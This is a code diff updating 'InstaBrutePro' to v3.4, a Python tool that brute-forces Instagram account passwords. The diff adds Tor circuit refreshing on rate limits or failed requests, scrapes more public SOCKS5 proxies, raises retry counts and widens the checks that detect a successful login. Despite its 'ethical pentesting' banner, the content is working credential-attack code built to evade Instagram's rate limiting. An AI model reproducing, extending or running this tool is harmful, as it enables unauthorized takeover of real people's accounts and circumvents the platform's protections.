@@ -16,6 +16,7 @@ from queue import Queue
 from concurrent.futures import ThreadPoolExecutor
 import urllib.parse
 import logging
+import subprocess
 
 # Setup logging
 logging.basicConfig(filename='debug.log', level=logging.DEBUG, format='%(asctime)s - %(message)s')
@@ -35,7 +36,7 @@ print(" | __ ) _   _ ___| |__   ___| __ ) _ __ __ _| |__   |_ _|_ __  ")
 print(" |  _ \\| | | / __| '_ \\ / __|  _ \\| '__/ _` | '_ \\   | || '_ \\ ")
 print(" | |_) | |_| \\__ \\ |_) | (__| |_) | | | (_| | |_) |  | || | | |")
 print(" |____/ \\__,_/|___/_.__/ \\___|____/|_|  \\__,_|_.__/  |___|_| |_|")
-print(f"           {Colors.CYAN} InstaBrutePro v3.3 - by Soly {Colors.NC}")
+print(f"           {Colors.CYAN} InstaBrutePro v3.4 - by Soly {Colors.NC}")
 print(f"{Colors.YELLOW}[*] Smartest Instagram Brute-Forcer for Ethical Pentesting Only{Colors.NC}")
 print(f"{Colors.RED}[!] Legal: Consent REQUIRED. Unauthorized use ILLEGAL (CFAA).{Colors.NC}\n")
 
@@ -72,7 +73,7 @@ def load_checkpoint():
         return None
 
 def leet_speak(keyword):
-    """Generate leet speak variations (e.g., apple -> 4ppl3)."""
+    """Generate leet speak variations (e.g., maria -> m4r14)."""
     replacements = {'a': ['4', '@'], 'e': ['3'], 'i': ['1', '!'], 'o': ['0'], 's': ['$']}
     variations = [keyword]
     for char, subs in replacements.items():
@@ -84,7 +85,7 @@ def leet_speak(keyword):
     return list(set(variations))
 
 def interleave_keywords(keyword1, keyword2):
-    """Interleave two keywords (e.g., apple, 2511 -> ap25ple11)."""
+    """Interleave two keywords (e.g., maria, 2511 -> ma25ria11)."""
     result = []
     min_len = min(len(keyword1), len(keyword2))
     interleaved = ''
@@ -142,7 +143,7 @@ def generate_variations(keywords, username, mode, max_variations):
     return list(variations)[:max_variations] if max_variations != 'unlimited' else list(variations)
 
 def is_valid_proxy(proxy):
-    """Validate proxy against instagram.com:443."""
+    """Validate proxy with full CSRF fetch simulation."""
     if not proxy.startswith('socks5://'):
         return False
     try:
@@ -150,34 +151,49 @@ def is_valid_proxy(proxy):
         port = int(port)
         if host == 'placeholder' or not host or port < 1 or port > 65535:
             return False
-        socks.set_default_proxy(socks.SOCKS5, host, port)
         session = requests.Session()
         session.proxies = {'http': proxy, 'https': proxy}
-        retry = Retry(total=5, backoff_factor=0.5, status_forcelist=[429, 500, 502, 503, 504])
+        retry = Retry(total=7, backoff_factor=0.5, status_forcelist=[429, 500, 502, 503, 504])
         adapter = HTTPAdapter(max_retries=retry)
         session.mount('https://', adapter)
         session.headers = {'User-Agent': UA}
-        resp = session.get("https://www.instagram.com", timeout=15)
+        resp = session.get("https://www.instagram.com/accounts/login/", timeout=20)
+        csrf = resp.cookies.get('csrftoken', '')
         session.close()
-        return resp.status_code == 200
+        return resp.status_code == 200 and csrf
     except Exception as e:
         logging.debug(f"Proxy validation failed for {proxy}: {str(e)}")
         return False
 
+def refresh_tor_circuit(port):
+    """Refresh Tor circuit for a given port."""
+    try:
+        import stem.control
+        with stem.control.Controller.from_port(port=int(port)) as controller:
+            controller.authenticate()
+            controller.signal(stem.Signal.NEWNYM)
+        print(f"{Colors.GREEN}[+] Tor circuit refreshed for port {port}{Colors.NC}")
+    except Exception as e:
+        print(f"{Colors.RED}[!] Failed to refresh Tor circuit for port {port}: {e}{Colors.NC}")
+
 def fetch_proxies():
     """Fetch proxies from multiple sources."""
-    proxies = [f"socks5://127.0.0.1:{port}" for port in TOR_PORTS]
+    proxies = []
+    for port in TOR_PORTS:
+        if is_valid_proxy(f"socks5://127.0.0.1:{port}"):
+            proxies.append(f"socks5://127.0.0.1:{port}")
     sources = [
         "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all",
         "https://www.free-proxy-list.net/anonymous-proxy.txt",
-        "https://api.openproxy.space/list?type=socks5"
+        "https://api.openproxy.space/list?type=socks5",
+        "https://spys.me/socks.txt"
     ]
     for source in sources:
         try:
-            resp = requests.get(source, timeout=15)
+            resp = requests.get(source, timeout=20)
             if resp.status_code == 200:
                 if source.endswith('.txt'):
-                    new_proxies = [f"socks5://{line.strip()}" for line in resp.text.splitlines() if line.strip()]
+                    new_proxies = [f"socks5://{line.strip()}" for line in resp.text.splitlines() if line.strip() and ':' in line]
                 else:
                     new_proxies = [f"socks5://{p['ip']}:{p['port']}" for p in resp.json() if p.get('ip') and p.get('port')]
                 proxies.extend([p for p in new_proxies if is_valid_proxy(p) and p not in proxies])
@@ -193,7 +209,7 @@ def refresh_proxies():
     random.shuffle(proxies)
     with open('proxies/free_proxies.txt', 'w') as f:
         f.write('\n'.join(proxies))
-    return proxies[:500]
+    return proxies[:1000]
 
 def get_proxies():
     proxies = fetch_proxies()
@@ -234,21 +250,24 @@ def check_tor_ports():
     return working_ports
 
 def get_csrf(proxies):
-    for _ in range(10):
+    for _ in range(15):
         proxy = random.choice(proxies)
         if not is_valid_proxy(proxy):
             print(f"{Colors.RED}[!] Skipping invalid proxy: {proxy}{Colors.NC}")
+            if proxy.startswith('socks5://127.0.0.1:'):
+                port = proxy.split(':')[-1]
+                refresh_tor_circuit(port)
             continue
         session = requests.Session()
         session.proxies = {'http': proxy, 'https': proxy}
-        retry = Retry(total=5, backoff_factor=0.5, status_forcelist=[429, 500, 502, 503, 504])
+        retry = Retry(total=7, backoff_factor=0.5, status_forcelist=[429, 500, 502, 503, 504])
         adapter = HTTPAdapter(max_retries=retry)
         session.mount('https://', adapter)
         session.headers = {'User-Agent': UA}
         print(f"{Colors.YELLOW}[*] Fetching CSRF token via {proxy}...{Colors.NC}")
         try:
-            resp = session.get("https://www.instagram.com/accounts/login/", timeout=15)
-            logging.debug(f"CSRF request response: {resp.text}")
+            resp = session.get("https://www.instagram.com/accounts/login/", timeout=20)
+            logging.debug(f"CSRF request response: Status={resp.status_code}, Headers={resp.headers}, Cookies={resp.cookies.get_dict()}, Body={resp.text}")
             csrf = resp.cookies.get('csrftoken', '')
             session.close()
             if csrf:
@@ -258,6 +277,9 @@ def get_csrf(proxies):
         except Exception as e:
             print(f"{Colors.RED}[!] CSRF fetch error: {e}{Colors.NC}")
             logging.debug(f"CSRF fetch error: {str(e)}")
+            if proxy.startswith('socks5://127.0.0.1:'):
+                port = proxy.split(':')[-1]
+                refresh_tor_circuit(port)
         finally:
             session.close()
     return None
@@ -276,15 +298,17 @@ def try_password(username, password, proxies):
             print(f"{Colors.RED}[!] Failed to refresh CSRF token{Colors.NC}")
             return False, None
         attempts_since_last_csrf_refresh = 0
-    # Try up to 5 proxies
-    for _ in range(5):
+    for _ in range(7):
         proxy = random.choice(proxies)
         if not is_valid_proxy(proxy):
             print(f"{Colors.RED}[!] Invalid proxy: {proxy}{Colors.NC}")
+            if proxy.startswith('socks5://127.0.0.1:'):
+                port = proxy.split(':')[-1]
+                refresh_tor_circuit(port)
             continue
         session = requests.Session()
         session.proxies = {'http': proxy, 'https': proxy}
-        retry = Retry(total=5, backoff_factor=0.5, status_forcelist=[429, 500, 502, 503, 504])
+        retry = Retry(total=7, backoff_factor=0.5, status_forcelist=[429, 500, 502, 503, 504])
         adapter = HTTPAdapter(max_retries=retry)
         session.mount('https://', adapter)
         session.headers = {
@@ -309,11 +333,11 @@ def try_password(username, password, proxies):
         }
         signed = sign_payload(payload)
         try:
-            resp = session.post(LOGIN_URL, data=signed, timeout=15)
+            resp = session.post(LOGIN_URL, data=signed, timeout=20)
             attempts_since_last_proxy_refresh += 1
             attempts_since_last_csrf_refresh += 1
             time.sleep(current_delay + random.uniform(0, 0.5))
-            logging.debug(f"Login attempt for {username}:{password} via {proxy} - Status: {resp.status_code}, Response: {resp.text}")
+            logging.debug(f"Login attempt for {username}:{password} via {proxy} - Status: {resp.status_code}, Headers: {resp.headers}, Cookies: {resp.cookies.get_dict()}, Response: {resp.text}")
             try:
                 json_resp = resp.json()
             except ValueError:
@@ -324,7 +348,9 @@ def try_password(username, password, proxies):
             if (json_resp.get('authenticated') is True or
                 json_resp.get('status') == 'ok' or
                 'logged_in_user' in json_resp or
-                'user_id' in json_resp):
+                'user_id' in json_resp or
+                'user' in json_resp or
+                resp.cookies.get('sessionid')):
                 with lock:
                     print(f"{Colors.GREEN}[+] CRACKED! {username}:{password}{Colors.NC}")
                     with open('hits/cracked.txt', 'a') as f:
@@ -332,13 +358,16 @@ def try_password(username, password, proxies):
                     found = True
                     return True, csrf
             elif any(x in resp.text for x in ['checkpoint_required', 'two_factor_required']):
-                print(f"{Colors.YELLOW}[!] Checkpoint/2FA on {password} - Manual verify required!{Colors.NC}")
+                print(f"{Colors.YELLOW}[!] Checkpoint/2FA on {password} - Manual verify required! Check Instagram app for {username}.{Colors.NC}")
                 logging.debug(f"Checkpoint/2FA for {password}: {resp.text}")
                 current_delay = min(current_delay * 2, 2.0)
                 return False, csrf
             elif any(x in resp.text for x in ['"spam":true', 'rate_limit']):
                 print(f"{Colors.RED}[!] Rate limit on {password} - Rotating proxy{Colors.NC}")
                 current_delay = min(current_delay * 2, 2.0)
+                if proxy.startswith('socks5://127.0.0.1:'):
+                    port = proxy.split(':')[-1]
+                    refresh_tor_circuit(port)
                 continue
             else:
                 print(f"{Colors.CYAN}[-] Fail: {password}{Colors.NC}")
@@ -348,6 +377,9 @@ def try_password(username, password, proxies):
             print(f"{Colors.RED}[!] Error for {password}: {e}{Colors.NC}")
             logging.debug(f"Error for {password}: {str(e)}")
             current_delay = min(current_delay * 2, 2.0)
+            if proxy.startswith('socks5://127.0.0.1:'):
+                port = proxy.split(':')[-1]
+                refresh_tor_circuit(port)
             continue
         finally:
             session.close()
@@ -371,7 +403,7 @@ def worker(queue, username, proxies, mode):
 def select_mode():
     """Interactive mode selection."""
     print(f"{Colors.YELLOW}[*] Select brute-force mode:{Colors.NC}")
-    print("1. Two-Keyword Mode (e.g., apple + 2511 -> apple2511, ap25ple11)")
+    print("1. Two-Keyword Mode (e.g., maria + 2511 -> maria2511, ma25ria11)")
     print("2. Normal Mode (use passwords from wordlist as-is)")
     print("3. All Mode (two-keyword combos, leet speak, username variations, normal)")
     while True:
@@ -422,7 +454,7 @@ def main():
     proxies = get_proxies()
     proxies = sort_proxies(proxies)
     if not proxies:
-        print(f"{Colors.RED}[!] No valid proxies available! Exiting{Colors.NC}")
+        print(f"{Colors.RED}[!] No valid proxies available! Add premium proxies or check Tor with ./multitor.sh{Colors.NC}")
         return
 
     # Pre-fetch CSRF token
@@ -449,7 +481,7 @@ def main():
         words = generate_variations(keywords, args.u, mode, max_variations)
     print(f"{Colors.GREEN}[+] Generated {len(words)} password variations{Colors.NC}")
 
-     # Load checkpoint
+    # Load checkpoint
     if args.r:
         checkpoint = load_checkpoint()
         if checkpoint and checkpoint['username'] == args.u and checkpoint['wordlist'] == args.w and checkpoint['mode'] == mode:
